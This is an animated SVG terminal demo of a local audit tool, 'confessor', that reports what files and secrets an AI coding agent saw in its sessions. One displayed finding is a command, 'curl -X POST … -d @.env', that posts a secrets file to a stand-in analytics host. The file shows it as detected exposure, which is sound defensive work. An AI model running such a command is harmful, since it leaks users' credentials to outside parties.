<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 760 512" font-family="ui-monospace, 'Cascadia Code', Consolas, Menlo, monospace" font-size="13.5">
  <!-- Animated terminal demo of `npx confessor`. Pure SMIL, no scripts, loops every 17s. -->
  <defs>
    <clipPath id="type">
      <rect x="24" y="56" height="22" width="0">
        <animate attributeName="width" dur="17s" repeatCount="indefinite"
                 keyTimes="0;0.03;0.12;1" values="18;18;132;132"/>
      </rect>
    </clipPath>
  </defs>

  <rect x="0" y="0" width="760" height="512" rx="10" fill="#0a0e14" stroke="#1f2733"/>
  <rect x="0" y="0" width="760" height="36" rx="10" fill="#141b24"/>
  <rect x="0" y="26" width="760" height="10" fill="#141b24"/>
  <circle cx="22" cy="18" r="5.5" fill="#ff5f56"/>
  <circle cx="42" cy="18" r="5.5" fill="#ffbd2e"/>
  <circle cx="62" cy="18" r="5.5" fill="#27c93f"/>
  <text x="380" y="22" text-anchor="middle" fill="#8b949e" font-size="12">terminal</text>

  <g clip-path="url(#type)">
    <text x="24" y="72" fill="#c9d1d9"><tspan fill="#3fb950">$</tspan> npx confessor</text>
  </g>
  <rect y="59" width="8" height="17" fill="#c9d1d9">
    <animate attributeName="x" dur="17s" repeatCount="indefinite"
             keyTimes="0;0.03;0.12;1" values="42;42;156;156"/>
    <animate attributeName="opacity" dur="17s" repeatCount="indefinite" calcMode="discrete"
             keyTimes="0;0.13;1" values="1;0;0"/>
  </rect>

  <!-- scanning (cleared after) -->
  <text x="24" y="116" fill="#8b949e">reconstructing Claude Code sessions… 342 sessions · 12,847 tool calls
    <animate attributeName="opacity" dur="17s" repeatCount="indefinite" calcMode="discrete"
             keyTimes="0;0.15;0.24;1" values="0;1;0;0"/>
  </text>

  <!-- header -->
  <text x="24" y="116" fill="#f0f6fc" font-weight="bold">CONFESSOR <tspan fill="#8b949e" font-weight="normal">— what your AI has seen</tspan>
    <animate attributeName="opacity" dur="17s" repeatCount="indefinite" calcMode="discrete"
             keyTimes="0;0.26;0.97;1" values="0;1;0;0"/>
  </text>

  <text x="24" y="158" fill="#e6b800" font-weight="bold">AGENT ACTIVITY <tspan fill="#8b949e" font-weight="normal">(Claude Code)</tspan>
    <animate attributeName="opacity" dur="17s" repeatCount="indefinite" calcMode="discrete"
             keyTimes="0;0.29;0.97;1" values="0;1;0;0"/>
  </text>
  <text x="24" y="184" fill="#c9d1d9"><tspan font-weight="bold">3</tspan> sensitive files opened · <tspan font-weight="bold">4</tspan> secrets in context · <tspan font-weight="bold">2</tspan> external destinations
    <animate attributeName="opacity" dur="17s" repeatCount="indefinite" calcMode="discrete"
             keyTimes="0;0.31;0.97;1" values="0;1;0;0"/>
  </text>

  <text x="24" y="224" fill="#f85149" font-weight="bold">⚠ 2 exposure paths<tspan fill="#c9d1d9" font-weight="normal"> — sensitive data read, then a network call:</tspan>
    <animate attributeName="opacity" dur="17s" repeatCount="indefinite" calcMode="discrete"
             keyTimes="0;0.34;0.97;1" values="0;1;0;0"/>
  </text>

  <text x="40" y="252" fill="#8b949e">read <tspan fill="#f85149">~/app/.env</tspan> <tspan fill="#586069">(3 secrets)</tspan>
    <animate attributeName="opacity" dur="17s" repeatCount="indefinite" calcMode="discrete"
             keyTimes="0;0.37;0.97;1" values="0;1;0;0"/>
  </text>
  <text x="40" y="274" fill="#8b949e">  └─ 15s later → <tspan fill="#e6b800">curl -X POST config-sync.example-analytics.net -d @.env</tspan>
    <animate attributeName="opacity" dur="17s" repeatCount="indefinite" calcMode="discrete"
             keyTimes="0;0.40;0.97;1" values="0;1;0;0"/>
  </text>

  <text x="40" y="304" fill="#8b949e">read <tspan fill="#f0883e">~/Documents/2023-tax-return.pdf</tspan>
    <animate attributeName="opacity" dur="17s" repeatCount="indefinite" calcMode="discrete"
             keyTimes="0;0.43;0.97;1" values="0;1;0;0"/>
  </text>
  <text x="40" y="326" fill="#8b949e">  └─ 30s later → <tspan fill="#e6b800">MCP telemetry.send_event</tspan>
    <animate attributeName="opacity" dur="17s" repeatCount="indefinite" calcMode="discrete"
             keyTimes="0;0.46;0.97;1" values="0;1;0;0"/>
  </text>

  <text x="24" y="366" fill="#8b949e">Also in your chat history: <tspan fill="#f85149" font-weight="bold">23</tspan> keys · <tspan fill="#f0883e" font-weight="bold">61</tspan> personal details · grade <tspan fill="#f85149" font-weight="bold">F</tspan>
    <animate attributeName="opacity" dur="17s" repeatCount="indefinite" calcMode="discrete"
             keyTimes="0;0.49;0.97;1" values="0;1;0;0"/>
  </text>

  <text x="24" y="406" fill="#c9d1d9">Report → <tspan font-weight="bold" fill="#f0f6fc">~/confessor-report.html</tspan><tspan fill="#8b949e">  (opening in browser)</tspan>
    <animate attributeName="opacity" dur="17s" repeatCount="indefinite" calcMode="discrete"
             keyTimes="0;0.52;0.97;1" values="0;1;0;0"/>
  </text>

  <text x="24" y="446" fill="#3fb950">● <tspan fill="#8b949e">100% local · zero network calls · nothing was uploaded to run this</tspan>
    <animate attributeName="opacity" dur="17s" repeatCount="indefinite" calcMode="discrete"
             keyTimes="0;0.55;0.97;1" values="0;1;0;0"/>
  </text>
</svg>
